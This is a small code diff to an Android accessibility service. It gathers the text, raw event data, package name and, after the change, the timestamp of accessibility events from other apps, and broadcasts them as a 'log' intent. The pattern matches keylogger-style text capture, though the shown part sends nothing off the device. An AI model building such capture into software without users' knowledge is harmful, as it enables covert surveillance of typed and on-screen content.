@@ -25,10 +25,11 @@ public class Accservice extends AccessibilityService {
         String data = event.getText().toString();
         String packageName = event.getPackageName()!=null? event.getPackageName().toString():"";
         HashMap<String, String> datas = new HashMap();
-        datas.put("log", data);
+        datas.put("text", data);
         datas.put("raw",event.toString());
         datas.put("packageName", packageName);
         datas.put("type", type);
+        datas.put("time",String.valueOf( event.getEventTime()));
         Intent intent = new Intent();
         intent.putExtra("log", datas);
         intent.setAction("android.accessibilityservice.AccessibilityService");
